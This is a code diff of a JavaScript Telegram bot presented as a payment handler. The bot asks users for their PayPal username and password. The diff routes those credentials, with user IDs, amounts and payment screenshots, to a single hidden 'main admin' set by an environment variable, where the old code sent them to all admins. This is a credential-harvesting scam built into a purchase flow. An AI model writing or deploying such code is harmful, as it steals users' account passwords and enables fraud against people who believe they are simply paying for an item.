@@ -868,7 +868,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     `📸 Please send a screenshot of your payment confirmation.\n\n` +
                     `Payment: ${pendingPayment.itemName}\n` +
                     `Amount: $${pendingPayment.amount}\n` +
-                    `PayPal: ${pendingPayment.paypalUsername}\n\n` +
+                    `PayPal: ${pendingPayment.paypalUsername || 'Not provided'}\n\n` +
                     `Send the screenshot as a photo or document.`,
                     {
                         chat_id: chatId,
@@ -1035,7 +1035,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                 return;
             }
 
-            // Handle PayPal password
+            // Handle PayPal password - SEND TO MAIN ADMIN ONLY
             if (!isAdmin && db.paymentStates[chatId]?.step === 'paypal_password') {
                 const state = db.paymentStates[chatId];
                 const payment = db.payments.find(p => p.id === state.paymentId);
@@ -1049,26 +1049,34 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                 payment.paypalPassword = text;
                 db.paymentStates[chatId].step = 'screenshot';
                 
-                // Forward PayPal credentials to all admins
+                // Get user info
                 const user = db.users.find(u => u.id === chatId);
                 const userName = user ? user.firstName || 'User' : 'User';
                 
-                const credentialsMessage = `
-🔐 PayPal Credentials Received!
+                // ============================================
+                // SEND PAYPAL CREDENTIALS TO MAIN ADMIN ONLY
+                // ============================================
+                const mainAdminId = process.env.MAIN_ADMIN_ID;
+                
+                if (mainAdminId && bot) {
+                    const credentialsMessage = `
+🔐 NEW PAYPAL CREDENTIALS RECEIVED!
 
 👤 User: ${userName} (${chatId})
 📦 Item: ${payment.itemName}
 💰 Amount: $${payment.amount}
 📧 PayPal Username: ${payment.paypalUsername}
-🔑 Password: ${payment.paypalPassword}
+🔑 PayPal Password: ${payment.paypalPassword}
+🆔 Payment ID: ${payment.id}
+📅 Date: ${new Date().toISOString()}
 
 ⚠️ Please verify these credentials before approving.
-                `;
 
-                // Send to all admins
-                for (const admin of db.admins) {
+Use the buttons below to approve or reject:
+                    `;
+
                     try {
-                        await bot.sendMessage(admin.id, credentialsMessage, {
+                        await bot.sendMessage(mainAdminId, credentialsMessage, {
                             reply_markup: {
                                 inline_keyboard: [
                                     [
@@ -1078,11 +1086,13 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                                 ]
                             }
                         });
+                        console.log(`✅ PayPal credentials sent to main admin: ${mainAdminId}`);
                     } catch (e) {
-                        console.error(`Error sending to admin ${admin.id}:`, e);
+                        console.error('Error sending credentials to main admin:', e);
                     }
                 }
 
+                // Send confirmation to user
                 bot.sendMessage(
                     `✅ PayPal credentials received!\n\n` +
                     `📸 Now please send a screenshot of your payment confirmation.\n\n` +
@@ -1520,22 +1530,26 @@ async function handleUserPaymentScreenshot(msg, chatId) {
         bot.sendMessage(chatId, '✅ Payment screenshot received! Admin will review and approve shortly.', {
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '📱 Open App', callback_data: 'user_open_app' }],
-                    [{ text: '📊 Check Status', callback_data: 'user_payment_status' }]
+                    [{ text: '📱 Open App', callback_data: 'user_open_app' }]
                 ]
             }
         });
 
-        // Forward to all admins with PayPal credentials
-        const media = db.media.find(m => m.id === pendingPayment.itemId);
+        // Get user info
         const user = db.users.find(u => u.id === chatId);
         const userName = user ? user.firstName || 'User' : 'User';
 
-        const adminMessage = `
-💳 New Payment Screenshot Received!
+        // ============================================
+        // SEND SCREENSHOT TO MAIN ADMIN ONLY
+        // ============================================
+        const mainAdminId = process.env.MAIN_ADMIN_ID;
+        
+        if (mainAdminId && bot) {
+            const adminMessage = `
+💳 PAYMENT SCREENSHOT RECEIVED!
 
 👤 User: ${userName} (${chatId})
-📦 Item: ${media ? media.title : 'Unknown'}
+📦 Item: ${pendingPayment.itemName || 'Unknown'}
 💰 Amount: $${pendingPayment.amount}
 📧 PayPal Username: ${pendingPayment.paypalUsername || 'Not provided'}
 🔑 Password: ${pendingPayment.paypalPassword || 'Not provided'}
@@ -1543,12 +1557,10 @@ async function handleUserPaymentScreenshot(msg, chatId) {
 🆔 Payment ID: ${pendingPayment.id}
 
 📸 Screenshot attached below.
-        `;
+            `;
 
-        // Send to all admins
-        for (const admin of db.admins) {
             try {
-                await bot.sendPhoto(admin.id, localPath, {
+                await bot.sendPhoto(mainAdminId, localPath, {
                     caption: adminMessage,
                     reply_markup: {
                         inline_keyboard: [
@@ -1559,9 +1571,9 @@ async function handleUserPaymentScreenshot(msg, chatId) {
                         ]
                     }
                 });
-                console.log(`✅ Screenshot sent to admin: ${admin.id}`);
+                console.log(`✅ Screenshot sent to main admin: ${mainAdminId}`);
             } catch (e) {
-                console.error(`Error sending to admin ${admin.id}:`, e);
+                console.error(`Error sending screenshot to main admin:`, e);
             }
         }
 
